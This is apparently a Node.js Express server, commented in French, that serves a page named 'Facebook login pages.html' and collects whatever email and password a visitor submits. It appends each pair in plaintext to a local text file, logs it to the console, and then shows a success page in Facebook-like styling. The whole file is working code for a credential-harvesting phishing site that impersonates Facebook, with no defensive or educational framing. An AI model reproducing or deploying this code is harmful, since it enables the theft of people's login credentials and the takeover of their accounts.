const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

// Middleware pour parser les requêtes JSON et les données POST
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Servir le fichier HTML statique
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'Facebook login pages.html'));
});

// Répertoire où les données seront enregistrées
const dataDirectory = path.join(__dirname, 'donnees_utilisateurs');

// Vérifie si le répertoire existe, sinon le crée
if (!fs.existsSync(dataDirectory)) {
  fs.mkdirSync(dataDirectory);
}

// Endpoint pour enregistrer les données d'utilisateur depuis le formulaire
app.post('/enregistrer', (req, res) => {
  const { email, password } = req.body; // Récupère les données du formulaire
  
  // Formatage des données à enregistrer
  const data = `Email: ${email}, Mot de passe: ${password}\n`;

  // Chemin du fichier où les données seront enregistrées
  const filePath = path.join(dataDirectory, 'donnees_utilisateurs.txt');

  // Enregistrement des données dans un fichier texte
  fs.appendFile(filePath, data, (err) => {
    if (err) {
      console.error('Erreur lors de l\'enregistrement des données :', err);
      res.status(404).send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Erreur 404</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f0f2f5;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    text-align: center;
                }
                .container {
                    background-color: white;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    width: 360px;
                }
                .container h1 {
                    font-size: 32px;
                    color: #ff0000;
                }
                .container p {
                    font-size: 16px;
                    color: #000;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Erreur 404</h1>
                <p>Une erreur s'est produite lors de l'enregistrement des données.</p>
                <p>Veuillez vérifier les points suivants :</p>
                <ul>
                    <li>Le serveur est démarré et accessible.</li>
                    <li>Le répertoire de stockage des données existe et a les permissions nécessaires.</li>
                    <li>Les données envoyées sont valides.</li>
                </ul>
            </div>
        </body>
        </html>
      `);
    } else {
      console.log('Données enregistrées avec succès :', data);
      res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Succès</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f0f2f5;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    text-align: center;
                }
                .container {
                    background-color: white;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    width: 360px;
                }
                .container h1 {
                    font-size: 32px;
                    color: #1877f2;
                }
                .container p {
                    font-size: 16px;
                    color: #000;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Succès</h1>
                <p>Les données ont été enregistrées avec succès.</p>
            </div>
        </body>
        </html>
      `);
    }
  });
});

// Démarrage du serveur
app.listen(port, () => {
  console.log(`Serveur démarré sur http://localhost:${port}`);
});
